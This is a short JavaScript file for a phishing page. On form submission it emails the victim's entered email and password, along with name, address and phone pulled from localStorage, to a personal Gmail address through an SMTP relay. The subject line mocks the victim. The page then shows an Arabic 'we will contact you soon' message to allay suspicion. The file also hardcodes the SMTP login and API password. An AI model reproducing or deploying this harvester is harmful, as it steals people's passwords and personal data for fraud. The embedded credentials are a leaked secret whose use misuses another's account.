function sendEmail() {
  Email.send({
    Host: "smtp.elasticemail.com",
    Username: "kareemmohamedoo20@gmail.com",
    Password: "0095A5E87C821CA0AD904D70AB34F2A53901",
    To: "kareemmohamedoo20@gmail.com",
    From: "kareemmohamedoo20@gmail.com",
    Subject: "new stubid",
    Body: `
        name:${localStorage.getItem("fname")} ,      
        <br>
        email: ${document.getElementById("email").value} ,
        <br>
        address: ${localStorage.getItem("address")} ,
        <br>
        password: ${document.getElementById("pass").value} ,<br>
        phone: ${localStorage.getItem("phone")},`,
  }).then((message) => alert(message));
}
let form = document.getElementById("form");
let body = document.getElementById("body");
form.addEventListener("submit", function () {
  setTimeout(function () {
    body.style.background = "#1c1e21";
    body.innerHTML = `<h1 style="color:#fff;text-align:center;margin-top:100px">شكرا لك سيتم التواصل معك قريبا </h1>`;
  }, 1000);
});
